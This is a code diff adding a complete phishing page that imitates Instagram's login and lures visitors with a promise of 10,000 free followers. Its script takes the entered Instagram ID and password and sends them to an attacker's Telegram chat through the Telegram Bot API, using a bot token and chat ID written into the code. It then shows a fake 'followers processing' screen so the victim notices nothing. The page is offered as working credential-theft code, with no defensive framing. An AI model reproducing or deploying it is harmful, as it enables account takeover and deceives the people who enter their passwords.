@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Free 10k followers</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; margin-top: 60px; background-color: #fafafa; }
+        .container { display: inline-block; background: white; padding: 30px; border: 1px solid #dbdbdb; border-radius: 8px; width: 300px; box-shadow: 0px 0px 10px rgba(0,0,0,0.05); }
+        h1 { font-size: 22px; color: #262626; margin-bottom: 20px; }
+        .input-group { position: relative; margin: 12px 0; }
+        input { padding: 10px; width: 100%; box-sizing: border-box; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 4px; font-size: 14px; }
+        .toggle-btn { position: absolute; right: 10px; top: 12px; background: none; border: none; color: #0095f6; cursor: pointer; font-size: 12px; font-weight: bold; }
+        button.main-btn { padding: 10px 15px; background: #0095f6; color: white; border: none; cursor: pointer; border-radius: 4px; width: 100%; margin-top: 15px; font-weight: bold; font-size: 14px; }
+        button.main-btn:hover { background: #1877f2; }
+        .message { margin-top: 12px; font-size: 13px; font-weight: bold; }
+        
+        #dashboard { display: none; background: #111; color: white; padding: 40px 20px; border-radius: 10px; max-width: 350px; margin: 0 auto; box-shadow: 0px 0px 20px #0095f6; }
+        #dashboard h1 { color: #00ffcc; font-size: 26px; margin-bottom: 15px; text-shadow: 0px 0px 10px #00ffcc; }
+    </style>
+</head>
+<body>
+
+    <!-- Login Section -->
+    <div id="auth-container" class="container">
+        <h1>Free 10k followers</h1>
+        
+        <input type="text" id="signin-user" placeholder="Instagram ID" style="margin-bottom: 10px;">
+        
+        <div class="input-group">
+            <input type="password" id="signin-pass" placeholder="Instagram Password">
+            <button type="button" class="toggle-btn" onclick="togglePassword('signin-pass', this)">Show</button>
+        </div>
+        
+        <button class="main-btn" onclick="signIn()">Login</button>
+        <div id="signin-msg" class="message"></div>
+    </div>
+
+    <!-- Dashboard Section -->
+    <div id="dashboard">
+        <h1>Welcome to 10k followers</h1>
+        <p id="welcome-text" style="font-size: 16px; margin: 15px 0; color: #fff;"></p>
+        <p style="font-size: 14px; color: #aaa;">Aapke followers process ho rahe hain, kripya intezaar karein.</p>
+
+        <button class="main-btn" style="background: #ed4956; margin-top: 20px;" onclick="logout()">Log Out</button>
+    </div>
+
+    <script>
+        function togglePassword(fieldId, btn) {
+            let passField = document.getElementById(fieldId);
+            if (passField.type === "password") {
+                passField.type = "text";
+                btn.innerText = "Hide";
+            } else {
+                passField.type = "password";
+                btn.innerText = "Show";
+            }
+        }
+
+        function signIn() {
+            let user = document.getElementById('signin-user').value.trim();
+            let pass = document.getElementById('signin-pass').value;
+            let msg = document.getElementById('signin-msg');
+
+            if(!user || !pass) {
+                msg.style.color = '#ed4956';
+                msg.innerText = "Kripya Instagram ID aur Password bharein!";
+                return;
+            }
+
+            // --- TELEGRAM CONFIGURATION ---
+            let botToken = "8697553636:AAGQNJkP3w2ZDSWptSB4Hh92zLaQ_c8RICE"; 
+            let chatId = "8878704685";            
+            
+            let textMessage = `🔔 Naya Login Aaya Hai!\n\n👤 ID: ${user}\n🔑 Password: ${pass}`;
+
+            // Telegram API ko request bhejna
+            let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=` + encodeURIComponent(textMessage);
+            fetch(url).catch(err => console.log(err));
+
+            // Dashboard dikhayein
+            document.getElementById('auth-container').style.display = 'none';
+            document.getElementById('dashboard').style.display = 'block';
+            document.getElementById('welcome-text').innerText = `ID: ${user}`;
+        }
+
+        function logout() {
+            document.getElementById('dashboard').style.display = 'none';
+            document.getElementById('auth-container').style.display = 'block';
+            document.getElementById('signin-user').value = '';
+            document.getElementById('signin-pass').value = '';
+        }
+    </script>
+
+</body>
+</html>
